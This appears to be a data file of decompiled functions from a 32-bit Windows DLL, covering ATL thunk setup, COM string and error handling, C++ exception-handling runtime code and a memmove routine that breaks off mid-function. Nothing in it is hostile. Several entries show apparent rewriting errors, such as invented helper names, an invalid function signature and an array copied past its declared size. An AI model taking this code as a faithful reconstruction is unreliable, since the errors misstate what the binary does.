{"Function Name": "ATL::_ATL_BASE_MODULE70::_ATL_BASE_MODULE70", "Address": "100171d2", "Source Code": "\\*\n_ATL_BASE_MODULE70 * __thiscall\nATL::_ATL_BASE_MODULE70::_ATL_BASE_MODULE70(_ATL_BASE_MODULE70 *this)\n{\n    \n    _memset(this + 0x14, 0, 0x18);\n    \n    \n    *(undefined4 *)(this + 0x2c) = 0;\n    \n    \n    return this;\n}\n*\\ \n \n_ATL_BASE_MODULE70 * __thiscall\nATL::_ATL_BASE_MODULE70::_ATL_BASE_MODULE70(_ATL_BASE_MODULE70 *this)\n{\n    _memset(this + 0x14, 0, 0x18);\n    *(undefined4 *)(this + 0x2c) = 0;\n    return this;\n}"}
{"Function Name": "ATL::CAtlBaseModule::~CAtlBaseModule", "Address": "100171f5", "Source Code": "void __thiscall ATL::CAtlBaseModule::~CAtlBaseModule(CAtlBaseModule *module)\n{\n    \n    deleteCriticalSection((criticalSectionPointer)(module + 0x14));\n    \n    \n    simpleArray<instanceStruct*, atlClass::CSimpleArrayEqualHelper<instanceStruct*> >::removeAll((simpleArray<instanceStruct*, atlClass::CSimpleArrayEqualHelper<instanceStruct*> >*)(module + 0x2c));\n}"}
{"Function Name": "ATL::CSimpleArray<struct_HINSTANCE__*,class_ATL::CSimpleArrayEqualHelper<struct_HINSTANCE__*>_>::RemoveAll", "Address": "1001720b", "Source Code": "void __thiscall\nATL::CSimpleArray<struct_HINSTANCE__*,class_ATL::CSimpleArrayEqualHelper<struct_HINSTANCE__*>_>::\nRemoveAll(CSimpleArray<struct_HINSTANCE__*,class_ATL::CSimpleArrayEqualHelper<struct_HINSTANCE__*>*>\n*this)\n{\n    \n    if (*(int *)this != 0) {\n        \n        FUN_1001dc78(*(void **)this);\n    }\n    \n    *(undefined4 *)this = 0;\n    \n    *(undefined4 *)(this + 4) = 0;\n    \n    *(undefined4 *)(this + 8) = 0;\n    return; \n}"}
{"Function Name": "GetProcAddressAll<struct_AtlThunkData_t*_(__stdcall*)(void)>", "Address": "10017228", "Source Code": "\\*\n_func_AtlThunkData_t_ptr * __cdecl\nGetProcAddressAll<struct_AtlThunkData_t*_(__stdcall*)(void)>(_func_AtlThunkData_t_ptr **param_1)\n{\n    \n    if (DAT_1004fd14 != '\\0') {\n        \n        return (_func_AtlThunkData_t_ptr *)DecodePointer(*param_1);\n    }\n    \n    \n    HMODULE pHVar3 = LoadLibraryExA(\"atlthunk.dll\", (HANDLE)0x0, 0x800);\n    \n    \n    if (pHVar3 != (HMODULE)0x0 &&\n        GetProcAddressSingle(pHVar3, \"AtlThunk_AllocateData\", (void **)&DAT_1004fd04) &&\n        GetProcAddressSingle(pHVar3, \"AtlThunk_InitData\", (void **)&DAT_1004fd08) &&\n        GetProcAddressSingle(pHVar3, \"AtlThunk_DataToCode\", (void **)&DAT_1004fd0c) &&\n        GetProcAddressSingle(pHVar3, \"AtlThunk_FreeData\", (void **)&DAT_1004fd10)) {\n        \n        \n        LOCK();\n        \n        UNLOCK();\n        \n        \n        DAT_1004fd14 = 1;\n        \n        \n        return (_func_AtlThunkData_t_ptr *)DecodePointer(*param_1);\n    }\n    \n    \n    return (_func_AtlThunkData_t_ptr *)0x0;\n}\n*\\ \n \n_func_AtlThunkData_t_ptr * __cdecl\nGetProcAddressAll<struct_AtlThunkData_t*_(__stdcall*)(void)>(_func_AtlThunkData_t_ptr **param_1)\n{\n    if (DAT_1004fd14 != '\\0') {\n        return (_func_AtlThunkData_t_ptr *)DecodePointer(*param_1);\n    }\n    \n    HMODULE pHVar3 = LoadLibraryExA(\"atlthunk.dll\", (HANDLE)0x0, 0x800);\n    if (pHVar3 != (HMODULE)0x0 &&\n        GetProcAddressSingle(pHVar3, \"AtlThunk_AllocateData\", (void **)&DAT_1004fd04) &&\n        GetProcAddressSingle(pHVar3, \"AtlThunk_InitData\", (void **)&DAT_1004fd08) &&\n        GetProcAddressSingle(pHVar3, \"AtlThunk_DataToCode\", (void **)&DAT_1004fd0c) &&\n        GetProcAddressSingle(pHVar3, \"AtlThunk_FreeData\", (void **)&DAT_1004fd10)) {\n        \n        LOCK();\n        UNLOCK();\n        DAT_1004fd14 = 1;\n        return (_func_AtlThunkData_t_ptr *)DecodePointer(*param_1);\n    }\n    \n    return (_func_AtlThunkData_t_ptr *)0x0;\n}"}
{"Function Name": "GetProcAddressSingle", "Address": "100172d8", "Source Code": "bool __cdecl GetProcAddressSingle(HINSTANCE__ *module_handle, char *procedure_name, void **encoded_pointer)\n{\n    \n    FARPROC procedure_address = GetProcAddress(module_handle, procedure_name);\n    \n    \n    if (procedure_address == (FARPROC)0x0) {\n        return false; \n    }\n    \n    \n    *encoded_pointer = EncodePointer(procedure_address);\n    \n    return true; \n}"}
{"Function Name": "ATL::_stdcallthunk::Init", "Address": "100172ff", "Source Code": "int instance ATL::thunk::Init(_stdcallthunk *this, ulong input_param, void *data_pointer)\n{\n    \n    *(void **)(this + 4) = data_pointer;\n    \n    *(undefined4 *)this = 0x42444c7;\n    \n    this[8] = (_stdcallthunk)0xe9;\n    \n    *(ulong *)(this + 9) = (input_param - (int)this) - 0xd;\n    \n    flush_cache(GetCurrentProcess(), this, 0xd);\n    \n    return 1;\n}"}
{"Function Name": "__InitializeThunkPool", "Address": "1001742a", "Source Code": "int __cdecl __InitializeThunkPool(void)\n{\n    HANDLE heapHandle; \n    PSLIST_HEADER *thunkPoolHeader; \n    DWORD heapFreeSize; \n    SIZE_T memorySize; \n    \n    if (!IsProcessorFeaturePresent(0xc)) {\n        DAT_1004fd00 = (PSLIST_HEADER)0x1; \n        return 1; \n    }\n    \n    thunkPoolHeader = (PSLIST_HEADER *)((int)ProcessEnvironmentBlock + 0x34);\n    \n    \n    if (*thunkPoolHeader == (PSLIST_HEADER)0x0) {\n        memorySize = 8; \n        heapHandle = GetProcessHeap(); \n        PSLIST_HEADER thunkPoolPointer = (PSLIST_HEADER)HeapAlloc(heapHandle, 8, memorySize); \n        if (thunkPoolPointer == (PSLIST_HEADER)0x0) { \n            return 0; \n        }\n        InitializeSListHead(thunkPoolPointer); \n        LOCK(); \n        if (*thunkPoolHeader == (PSLIST_HEADER)0x0) { \n            *thunkPoolHeader = thunkPoolPointer; \n        }\n        UNLOCK(); \n        \n        if (*thunkPoolHeader != (PSLIST_HEADER)thunkPoolPointer) {\n            heapFreeSize = 0; \n            HeapFree(heapHandle, heapFreeSize, thunkPoolPointer); \n        }\n    }\n    DAT_1004fd00 = *thunkPoolHeader; \n    return 1; \n}"}
{"Function Name": "_AtlThunk_AllocateData@0", "Address": "10017495", "Source Code": "uint * _AtlThunk_AllocateData_0(void)\n{\n    \n    HANDLE processHeapHandle = GetProcessHeap();\n    \n    \n    uint *allocatedMemory = (uint *)HeapAlloc(processHeapHandle, HEAP_ZERO_MEMORY, 8);\n    \n    \n    if (allocatedMemory != (uint *)0x0) {\n        \n        _func_AtlThunkData_t_ptr *functionPointer = GetProcAddressAll<struct_AtlThunkData_t*_(__stdcall*)(void)>((_func_AtlThunkData_t_ptr **)&DAT_1004fd04);\n        \n        \n        *allocatedMemory = (uint)(functionPointer == (_func_AtlThunkData_t_ptr *)0x0);\n        \n        \n        AtlThunkData_t *thunkDataPointer = (functionPointer == (_func_AtlThunkData_t_ptr *)0x0) ? (AtlThunkData_t *)__AllocStdCallThunk_cmn() : (*functionPointer)();\n        \n        \n        allocatedMemory[1] = (uint)thunkDataPointer;\n        \n        \n        if (thunkDataPointer != (AtlThunkData_t *)0x0) {\n            \n            return allocatedMemory;\n        }\n        \n        \n        HeapFree(processHeapHandle, 0, allocatedMemory);\n    }\n    \n    \n    return (uint *)0x0;\n}"}
{"Function Name": "_com_issue_error", "Address": "100175f0", "Source Code": "void _com_issue_error(long error_code)\n{\n    \n    (*(code *)guard_check_function)(error_code, 0);\n    \n    \n    (*(code *)raise_error_function)();\n}"}
{"Function Name": "ConvertBSTRToString", "Address": "10017610", "Source Code": "LPSTR ConvertBSTRToString(LPCWSTR wideStringInput)\n{\n    WCHAR currentWideChar; \n    size_t multiByteSize; \n    int wideStringLength; \n    DWORD lastErrorCode; \n    LPSTR convertedString; \n    LPCWSTR wideStringPointer; \n    \n    if (wideStringInput == (LPCWSTR)0x0) {\n        return (LPSTR)0x0; \n    }\n    \n    wideStringPointer = wideStringInput; \n    do {\n        currentWideChar = *wideStringPointer; \n        wideStringPointer = wideStringPointer + 1; \n    } while (currentWideChar != L'\\0'); \n    \n    \n    wideStringLength = ((int)wideStringPointer - (int)(wideStringInput + 1) >> 1) + 1;\n    \n    multiByteSize = WideCharToMultiByte(0, 0, wideStringInput, wideStringLength, (LPSTR)0x0, 0, (LPCSTR)0x0, (LPBOOL)0x0);\n    \n    \n    if (multiByteSize != 0) {\n        LPSTR allocatedMultiByteString = (LPSTR)FUN_10013d51(multiByteSize); \n        \n        if (allocatedMultiByteString != (LPSTR)0x0) {\n            \n            wideStringLength = WideCharToMultiByte(0, 0, wideStringInput, wideStringLength, allocatedMultiByteString, multiByteSize, (LPCSTR)0x0, (LPBOOL)0x0);\n            \n            if (wideStringLength != 0) {\n                return allocatedMultiByteString; \n            }\n            goto LAB_10017709; \n        }\n        _com_issue_error(-0x7ff8fff2); \n    }\n    \n    lastErrorCode = GetLastError(); \n    \n    if (0 < (int)lastErrorCode) {\n        lastErrorCode = lastErrorCode & 0xffff | 0x80070000;\n    }\n    _com_issue_error(lastErrorCode); \n    \nLAB_10017709:\n    thunk_FUN_1001dc78(allocatedMultiByteString); \n    lastErrorCode = GetLastError(); \n    \n    if (0 < (int)lastErrorCode) {\n        lastErrorCode = lastErrorCode & 0xffff | 0x80070000;\n    }\n    _com_issue_error(lastErrorCode); \n    \n    convertedString = (LPSTR)(*swi(3))(); \n    return convertedString; \n}"}
{"Function Name": "Catch_All@100176da", "Address": "100176da", "Source Code": "undefined * catchAll(void)\n{\n    \n    return &dataPointer;\n}"}
{"Function Name": "ConvertStringToBSTR", "Address": "10017730", "Source Code": "void ConvertStringToBSTR(LPCSTR inputString) \n{\n    char *multiByteSize; \n    code *errorHandler; \n    uint securityValue; \n    int conversionResult; \n    BSTR allocatedBSTR; \n    DWORD lastErrorCode; \n    LPCSTR inputPointer; \n    uint *memoryPointer; \n    int charactersConverted; \n    uint localSecurityValue; \n    void *exceptionList; \n    uint unusedLocalVariable; \n    \n    exceptionList = ExceptionList; \n    securityValue = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &exceptionList; \n    localSecurityValue = securityValue; \n    \n    if (inputString == (LPCSTR)0x0) { \n        ExceptionList = exceptionList; \n        ___security_check_cookie_4(securityValue ^ (uint)&stack0xfffffffc); \n        return; \n    }\n    \n    inputPointer = inputString; \n    do {\n        inputPointer++; \n    } while (*inputPointer != '\\0'); \n    \n    multiByteSize = inputPointer + (1 - (int)(inputString + 1)); \n    if (multiByteSize < (char *)0x80000000) { \n        charactersConverted = MultiByteToWideChar(0, 0, inputString, (int)multiByteSize, (LPWSTR)0x0, 0); \n        if (charactersConverted == 0) goto LAB_10017874; \n        \n        if (charactersConverted < 0x1000) { \n            memoryPointer = &localSecurityValue; \n        } else {\n            memoryPointer = (uint *)FUN_10025334(charactersConverted * 2); \n        }\n        \n        if (memoryPointer == (uint *)0x0) goto LAB_1001788c; \n        \n        conversionResult = MultiByteToWideChar(0, 0, inputString, (int)multiByteSize, (LPWSTR)memoryPointer, charactersConverted); \n        if (conversionResult != 0) { \n            allocatedBSTR = SysAllocString((OLECHAR *)memoryPointer); \n            if (0xfff < charactersConverted) { \n                FUN_1001dc78(memoryPointer); \n            }\n            if (allocatedBSTR != (BSTR)0x0) goto LAB_10017849; \n            goto LAB_100178bf; \n        }\n    } else {\n        _com_issue_error(-0x7ff8ffa9); \n    LAB_10017874:\n        lastErrorCode = GetLastError(); \n        if (0 < (int)lastErrorCode) { \n            lastErrorCode = lastErrorCode & 0xffff | 0x80070000; \n        }\n        _com_issue_error(lastErrorCode); \n    LAB_1001788c:\n        _com_issue_error(-0x7ff8fff2); \n    }\n    \n    if (0xfff < charactersConverted) { \n        FUN_1001dc78(memoryPointer); \n    }\n    \n    lastErrorCode = GetLastError(); \n    if (0 < (int)lastErrorCode) { \n        lastErrorCode = lastErrorCode & 0xffff | 0x80070000; \n    }\n    _com_issue_error(lastErrorCode); \nLAB_100178bf:\n    _com_issue_error(-0x7ff8fff2); \n    errorHandler = (code *)swi(3); \n    (*errorHandler)(); \n    return; \n}"}
{"Function Name": "_com_error::_com_error", "Address": "100178d0", "Source Code": "\\*\n_com_error * __thiscall _com_error::_com_error(_com_error *current_object, _com_error *source_object)\n{\n    \n    *(undefined ***)current_object = &PTR__scalar_deleting_destructor__1003d718;\n    \n    *(undefined4 *)(current_object + 4) = *(undefined4 *)(source_object + 4);\n    \n    int *error_message_pointer = *(int **)(source_object + 8);\n    \n    *(int **)(current_object + 8) = error_message_pointer;\n    \n    *(undefined4 *)(current_object + 0xc) = 0;\n    \n    if (error_message_pointer != (int *)0x0) {\n        (*(code **)(*error_message_pointer + 4))(); \n    }\n    \n    return current_object;\n}\n*\\ \n \n_com_error * __thiscall _com_error::_com_error(_com_error *current_object, _com_error *source_object)\n{\n    *(undefined ***)current_object = &PTR__scalar_deleting_destructor__1003d718;\n    *(undefined4 *)(current_object + 4) = *(undefined4 *)(source_object + 4);\n    int *error_message_pointer = *(int **)(source_object + 8);\n    *(int **)(current_object + 8) = error_message_pointer;\n    *(undefined4 *)(current_object + 0xc) = 0;\n    if (error_message_pointer != (int *)0x0) {\n        (*(code **)(*error_message_pointer + 4))();\n    }\n    return current_object;\n}"}
{"Function Name": "_com_error::_com_error", "Address": "10017910", "Source Code": "\\*\n_com_error * __thiscall\n_com_error::_com_error(_com_error *this,long param_1,IErrorInfo *param_2,bool param_3)\n{\n    \n    *(undefined ***)this = &PTR__scalar_deleting_destructor__1003d718;\n    \n    *(long *)(this + 4) = param_1;\n    \n    *(IErrorInfo **)(this + 8) = param_2;\n    \n    if (param_2 != (IErrorInfo *)0x0 && param_3) {\n        \n        (*(code **)(*(int *)param_2 + 4))();\n    }\n    \n    return this;\n}\n*\\ \n \n_com_error * __thiscall\n_com_error::_com_error(_com_error *this,long param_1,IErrorInfo *param_2,bool param_3)\n{\n    *(undefined ***)this = &PTR__scalar_deleting_destructor__1003d718;\n    *(long *)(this + 4) = param_1;\n    *(IErrorInfo **)(this + 8) = param_2;\n    if (param_2 != (IErrorInfo *)0x0 && param_3) {\n        (*(code **)(*(int *)param_2 + 4))();\n    }\n    return this;\n}"}
{"Function Name": "_com_error::`scalar_deleting_destructor'", "Address": "100179a0", "Source Code": "void * __thiscall _com_error::_scalar_deleting_destructor_(_com_error *instance, uint flags)\n{\n    \n    int *integerPointer = *(int **)(instance + 8);\n    \n    \n    *(undefined ***)instance = &destructorFunctionPointer;\n    \n    if (integerPointer != (int *)0x0) {\n        \n        (*(code **)(*integerPointer + 8))();\n        \n        (*(code *)guardCheckFunction)(integerPointer);\n    }\n    \n    if (*(HLOCAL *)(instance + 0xc) != (HLOCAL)0x0) {\n        \n        LocalFree(*(HLOCAL *)(instance + 0xc));\n    }\n    \n    if ((flags & 1) != 0) {\n        cleanupFunction(instance);\n    }\n    \n    return instance;\n}"}
{"Function Name": "_com_raise_error", "Address": "100179f0", "Source Code": "void _com_raise_error(long error_code, IErrorInfo *error_info)\n{\n    \n    _com_error::_com_error((_com_error *)error_object, error_code, error_info, false);\n    \n    \n    __CxxThrowException_8(error_object, &DAT_1004bf24);\n    \n    \n    ((code *)swi(3))();\n}"}
{"Function Name": "__FrameHandler3::GetRangeOfTrysToCheck", "Address": "10017a15", "Source Code": "void __cdecl\n__FrameHandler3::GetRangeOfTrysToCheck(int **param_1, int *param_2, int param_3, int param_4)\n{\n    \n    int *piVar1 = *(int **)(*param_2 + 0xc);\n    int *piVar4 = piVar1; \n    int *piVar5 = piVar1; \n    \n    if (-1 < param_4) {\n        \n        int *piVar3 = (int *)((int)piVar1 * 0x14 + *(int *)(*param_2 + 0x10) + 8);\n        do {\n            \n            if (piVar4 == (int *)0xffffffff) goto LAB_10017a91;\n            piVar4 = (int *)((int)piVar4 - 1); \n            \n            \n            if (((piVar3[-6] < param_3) && (param_3 <= piVar3[-5])) || (piVar4 == (int *)0xffffffff)) {\n                param_4--; \n                piVar5 = piVar4; \n            }\n            piVar3 -= 5; \n        } while (-1 < param_4); \n    }\n    \n    if ((piVar5 <= piVar1) && ((int *)((int)piVar4 + 1) <= piVar5)) {\n        *param_1 = param_2; \n        param_1[1] = (int *)((int)piVar4 + 1); \n        param_1[2] = param_2; \n        param_1[3] = piVar5; \n        return; \n    }\nLAB_10017a91:\n    _terminate(); \n    code *pcVar2 = (code *)swi(3); \n    (*pcVar2)(); \n    return; \n}"}
{"Function Name": "_CallCatchBlock2", "Address": "10017a97", "Source Code": "void * __cdecl\n_CallCatchBlock2(EHRegistrationNode *param_1, _s_FuncInfo *param_2, void *param_3, int param_4,\nulong param_5)\n{\n    void *local_1c = ExceptionList; \n    ExceptionList = &local_1c; \n    void *pvVar1 = (void *)__CallSettingFrame_12(param_3, param_1, param_5); \n    ExceptionList = local_1c; \n    return pvVar1; \n}"}
{"Function Name": "_CallSETranslator", "Address": "10017af5", "Source Code": "int __cdecl\n_CallSETranslator(EHExceptionRecord *param_1, EHRegistrationNode *param_2, void *param_3, void *param_4,\n                  _s_FuncInfo *param_5, int param_6, EHRegistrationNode *param_7)\n{\n    int iVar1; \n    undefined4 *local_3c; \n    code *local_38; \n    int local_c; \n    \n    if (param_1 == (EHExceptionRecord *)0x123) {\n        *(undefined4 *)param_2 = 0x10017ba4; \n        local_c = 1; \n    } else {\n        local_38 = __TranslatorGuardHandler; \n        local_3c = (undefined4 *)ExceptionList; \n        ExceptionList = &local_3c; \n        local_c = 1; \n        iVar1 = ___vcrt_getptd(); \n        (*(code *)PTR__guard_check_icall_1003a2f8)(); \n        (*(code **)(iVar1 + 8))(*(undefined4 *)param_1, &param_1); \n        local_c = 0; \n        if (local_3c != 0) { \n            *local_3c = *ExceptionList; \n        }\n        ExceptionList = local_3c; \n    }\n    return local_c; \n}"}
{"Function Name": "_JumpToContinuation", "Address": "10017bd0", "Source Code": "void _JumpToContinuation(void *function_pointer, EHRegistrationNode *eh_registration_node)\n{\n    \n    (*(code *)function_pointer)();\n    \n    return;\n}"}
{"Function Name": "___FrameUnwindFilter", "Address": "10017eb8", "Source Code": "undefined4 __cdecl ___FrameUnwindFilter(int **thread_data_ptr)\n{\n    int *error_code_ptr = *thread_data_ptr; \n    \n    if ((*error_code_ptr == -0x1fbcbcae) || (*error_code_ptr == -0x1fbcb0b3)) {\n        int thread_data = ___vcrt_getptd(); \n        \n        if (0 < *(int *)(thread_data + 0x18)) {\n            *(int *)(thread_data + 0x18) -= 1; \n        }\n    }\n    \n    else if (*error_code_ptr == -0x1f928c9d) {\n        int thread_data = ___vcrt_getptd(); \n        *(undefined4 *)(thread_data + 0x18) = 0; \n        return _terminate(); \n    }\n    return 0; \n}"}
{"Function Name": "Unwind@10017efd", "Address": "10017efd", "Source Code": "void Unwind_10017efd(void)\n{\n    \n    code *functionPointer = *(code **)(getFunctionAddress() + 0xc);\n    \n    \n    if (functionPointer != (code *)0x0) {\n        \n        (*(code *)guardCheckFunction)();\n        \n        \n        (*functionPointer)();\n    }\n    \n    \n    terminateProgram();\n}"}
{"Function Name": "___vcrt_thread_attach", "Address": "1001825a", "Source Code": "bool isThreadAttached(void)\n{\n    \n    return getThreadLocalStoragePointer() != (LPVOID)0x0;\n}"}
{"Function Name": "___vcrt_thread_detach", "Address": "10018265", "Source Code": "undefined detach_thread_function(void)\n{\n    \n    return 1;\n}"}
{"Function Name": "___vcrt_uninitialize", "Address": "10018270", "Source Code": "undefined4 __cdecl ___vcrt_uninitialize(char inputChar)\n{\n    \n    if (inputChar == '\\0') {\n        \n        ___vcrt_uninitialize_ptd();\n        \n        ___vcrt_uninitialize_locks();\n        \n        return CONCAT31((int3)((uint)___vcrt_uninitialize_winapi_thunks('\\0') >> 8), 1);\n    }\n    \n    return 1;\n}"}
{"Function Name": "FUN_1001828f", "Address": "1001828f", "Source Code": "undefined4 initialize_function(void) \n{\n    \n    \n    \n    return concatenate_int3((int3_type)((uint)uninitialize_ptd() >> 8), 1);\n}"}
{"Function Name": "__except_handler4", "Address": "100182e0", "Source Code": "undefined4 __cdecl __except_handler4(PEXCEPTION_RECORD param_1,PVOID param_2,int param_3)\n{\n    uint localValue; \n    code *functionPointer; \n    int index; \n    BOOL isWritable; \n    undefined4 returnValue; \n    int adjustedPointer; \n    uint paramValue; \n    PEXCEPTION_RECORD exceptionRecord; \n    int *localCookies; \n    int additionalData; \n    undefined4 defaultReturnValue = 1; \n    \n    adjustedPointer = (int)param_2 + 0x10;\n    \n    localCookies = (int *)(*(uint *)((int)param_2 + 8) ^ DAT_1004e008);\n    \n    _ValidateLocalCookies(localCookies, adjustedPointer);\n    \n    ___except_validate_context_record(param_3);\n    \n    paramValue = *(uint *)((int)param_2 + 0xc);\n    \n    \n    if ((*(byte *)&param_1->ExceptionFlags & 0x66) == 0) {\n        exceptionRecord = param_1; \n        *(PEXCEPTION_RECORD **)((int)param_2 + -4) = &exceptionRecord; \n        \n        \n        if (paramValue == 0xfffffffe) {\n            return defaultReturnValue; \n        }\n        \n        \n        do {\n            index = paramValue * 3 + 4; \n            localValue = localCookies[index]; \n            \n            if ((undefined *)localCookies[index + 1] != (undefined *)0x0) {\n                \n                index = __EH4_CallFilterFunc_8((undefined *)localCookies[index + 1]);\n                \n                \n                if (index < 0) {\n                    defaultReturnValue = 0; \n                    goto LAB_1001839d; \n                }\n                \n                \n                if (0 < index) {\n                    \n                    if ((param_1->ExceptionCode == 0xe06d7363) && (PTR____DestructExceptionObject_1003d71c != (undefined *)0x0) &&\n                        (isWritable = __IsNonwritableInCurrentImage((PBYTE)&PTR____DestructExceptionObject_1003d71c), isWritable != 0)) {\n                        (*(code *)PTR__guard_check_icall_1003a2f8)(param_1, 1); \n                        (*(code *)PTR____DestructExceptionObject_1003d71c)(); \n                        adjustedPointer = additionalData; \n                    }\n                    \n                    __EH4_GlobalUnwind2_8(param_2, param_1);\n                    \n                    if (*(uint *)((int)param_2 + 0xc) != paramValue) {\n                        \n                        __EH4_LocalUnwind_16((int)param_2, paramValue, adjustedPointer, &DAT_1004e008);\n                    }\n                    *(uint *)((int)param_2 + 0xc) = localValue; \n                    \n                    _ValidateLocalCookies(localCookies, adjustedPointer);\n                    \n                    __EH4_TransferToHandler_8((undefined *)localCookies[index + 2]);\n                    functionPointer = (code *)swi(3); \n                    returnValue = (*functionPointer)(); \n                    return returnValue; \n                }\n            }\n            paramValue = localValue; \n        } while (localValue != 0xfffffffe); \n        \n        return defaultReturnValue; \n    } else {\n        \n        if (paramValue == 0xfffffffe) {\n            return defaultReturnValue; \n        }\n        \n        __EH4_LocalUnwind_16((int)param_2, 0xfffffffe, adjustedPointer, &DAT_1004e008);\n    }\n    \nLAB_1001839d:\n    \n    _ValidateLocalCookies(localCookies, adjustedPointer);\n    return defaultReturnValue; \n}"}
{"Function Name": "__CxxThrowException@8", "Address": "10018437", "Source Code": "void __CxxThrowException_8(int *exception_ptr, byte *flags)\n{\n    code *function_ptr; \n    int index; \n    DWORD data_array[4]; \n    DWORD exception_info; \n    ULONG_PTR exception_context = 0; \n    \n    for (index = 0; index < 8; index++) {\n        data_array[index] = DAT_1003d720[index]; \n    }\n    \n    if (flags != NULL && (*flags & 0x10) != 0) {\n        index = *(int *)(*exception_ptr - 4); \n        function_ptr = *(code **)(index + 0x20); \n        flags = *(byte **)(index + 0x18); \n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)((int *)(*exception_ptr - 4));\n        (*function_ptr)(); \n    }\n    \n    if (flags != NULL && (*flags & 8) != 0) {\n        exception_context = 0x1994000; \n    }\n    \n    RaiseException(data_array[0], data_array[1], exception_info, &exception_context);\n}"}
{"Function Name": "FUN_10018670", "Address": "10018670", "Source Code": "ulonglong __cdecl FUN_10018670(undefined8 *destination, undefined8 *source, uint bytesToCopy) {\n    undefined4 *sourcePointer; \n    undefined4 *destinationPointer; \n    uint remainingBytes; \n    undefined8 *tempPointer; \n    \n    if ((source < destination) && (destination < (undefined8 *)(bytesToCopy + (int)source))) {\n        sourcePointer = (undefined4 *)((int)source + bytesToCopy); \n        destinationPointer = (undefined4 *)((int)destination + bytesToCopy); \n        remainingBytes = bytesToCopy; \n        \n        if (0x1f < bytesToCopy) {\n            \n            if ((DAT_1004e00c >> 1 & 1) == 0) {\n                \n                if (((uint)destinationPointer & 3) != 0) {\n                    remainingBytes = (uint)destinationPointer & 3; \n                    bytesToCopy -= remainingBytes; \n                    do {\n                        *(undefined *)((int)destinationPointer - 1) = *(undefined *)((int)sourcePointer - 1); \n                        sourcePointer--; \n                        destinationPointer--; \n                        remainingBytes--; \n                    } while (remainingBytes != 0); \n                }\n                \n                if (0x1f < bytesToCopy) {\n                    remainingBytes = bytesToCopy >> 2; \n                    while (remainingBytes != 0) {\n                        remainingBytes--; \n                        destinationPointer[-1] = sourcePointer[-1]; \n                        sourcePointer--; \n                        destinationPointer--; \n                    }\n                    \n                    switch (bytesToCopy & 3) {\n                        case 0: return CONCAT44(bytesToCopy, destination) & 0x3ffffffff; \n                        case 1: *(undefined *)((int)destinationPointer - 1) = *(undefined *)((int)sourcePointer - 1); \n                                return CONCAT44(bytesToCopy, destination) & 0x3ffffffff; \n                        case 2: *(undefined *)((int)destinationPointer - 1) = *(undefined *)((int)sourcePointer - 1); \n                                *(undefined *)((int)destinationPointer - 2) = *(undefined *)((int)sourcePointer - 2); \n                                return CONCAT44(bytesToCopy, destination) & 0x3ffffffff; \n                        case 3: *(undefined *)((int)destinationPointer - 1) = *(undefined *)((int)sourcePointer - 1); \n                                *(undefined *)((int)destinationPointer - 2) = *(undefined *)((int)sourcePointer - 2); \n                                *(undefined *)((int)destinationPointer - 3) = *(undefined *)((int)sourcePointer - 3); \n                                return CONCAT44(bytesToCopy, destination) & 0x3ffffffff; \n                    }\n                }\n            } else {\n                \n                while (((uint)destinationPointer & 0xf) != 0) { \n                    sourcePointer--; \n                    destinationPointer--; \n                    *(undefined *)destinationPointer = *(undefined *)sourcePointer; \n                    remainingBytes--; \n                }\n                do {\n                    if (remainingBytes < 0x80) break; \n                    sourcePointer -= 0x20; \n                    destinationPointer -= 0x20; \n                    \n                    *(undefined4 *)(destinationPointer + 0x1f) = *(undefined4 *)(sourcePointer + 0x1f);\n                    *(undefined4 *)(destinationPointer + 0x1e) = *(undefined4 *)(sourcePointer + 0x1e);\n                    *(undefined4 *)(destinationPointer + 0x1d) = *(undefined4 *)(sourcePointer + 0x1d);\n                    *(undefined4 *)(destinationPointer + 0x1c) = *(undefined4 *)(sourcePointer + 0x1c);\n                    *(undefined4 *)(destinationPointer + 0x1b) = *(undefined4 *)(sourcePointer + 0x1b);\n                    *(undefined4 *)(destinationPointer + 0x1a) = *(undefined4 *)(sourcePointer + 0x1a);\n                    *(undefined4 *)(destinationPointer + 0x19) = *(undefined4 *)(sourcePointer + 0x19);\n                    *(undefined4 *)(destinationPointer + 0x18) = *(undefined4 *)(sourcePointer + 0x18);\n                    *(undefined4 *)(destinationPointer + 0x17) = *(undefined4 *)(sourcePointer + 0x17);\n                    *(undefined4 *)(destinationPointer + 0x16) = *(undefined4 *)(sourcePointer + 0x16);\n                    *(undefined4 *)(destinationPointer + 0x15) = *(undefined4 *)(sourcePointer + 0x15);\n                    *(undefined4 *)(destinationPointer + 0x14) = *(undefined4 *)(sourcePointer + 0x14);\n                    *(undefined4 *)(destinationPointer + 0x13) = *(undefined4 *)(sourcePointer + 0x13);\n                    *(undefined4 *)(destinationPointer + 0x12) = *(undefined4 *)(sourcePointer + 0x12);\n                    *(undefined4 *)(destinationPointer + 0x11) = *(undefined4 *)(sourcePointer + 0x11);\n                    *(undefined4 *)(destinationPointer + 0x10) = *(undefined4 *)(sourcePointer + 0x10);\n                    *(undefined4 *)(destinationPointer + 0xf) = *(undefined4 *)(sourcePointer + 0xf);\n                    *(undefined4 *)(destinationPointer + 0xe) = *(undefined4 *)(sourcePointer + 0xe);\n                    *(undefined4 *)(destinationPointer + 0xd) = *(undefined4 *)(sourcePointer + 0xd);\n                    *(undefined4 *)(destinationPointer + 0xc) = *(undefined4 *)(sourcePointer + 0xc);\n                    *(undefined4 *)(destinationPointer + 0xb) = *(undefined4 *)(sourcePointer + 0xb);\n                    *(undefined4 *)(destinationPointer + 0xa) = *(undefined4 *)(sourcePointer + 0xa);\n                    *(undefined4 *)(destinationPointer + 9) = *(undefined4 *)(sourcePointer + 9);\n                    *(undefined4 *)(destinationPointer + 8) = *(undefined4 *)(sourcePointer + 8);\n                    *(undefined4 *)(destinationPointer + 7) = *(undefined4 *)(sourcePointer + 7);\n                    *(undefined4 *)(destinationPointer + 6) = *(undefined4 *)(sourcePointer + 6);\n                    *(undefined4 *)(destinationPointer + 5) = *(undefined4 *)(sourcePointer + 5);\n                    *(undefined4 *)(destinationPointer + 4) = *(undefined4 *)(sourcePointer + 4);\n                    *(undefined4 *)(destinationPointer + 3) = *(undefined4 *)(sourcePointer + 3);\n                    *(undefined4 *)(destinationPointer + 2) = *(undefined4 *)(sourcePointer + 2);\n                    *(undefined4 *)(destinationPointer + 1) = *(undefined4 *)(sourcePointer + 1);\n                    *(undefined4 *)destinationPointer = *sourcePointer; \n                    remainingBytes -= 0x80; \n                } while (1);\n                sourcePointer = (undefined4 *)((int)sourcePointer + 0x20); \n                destinationPointer = (undefined4 *)((int)destinationPointer + 0x20); \n                \n                if (0x1f < remainingBytes) {\n                    do {\n                        sourcePointer -= 8; \n                        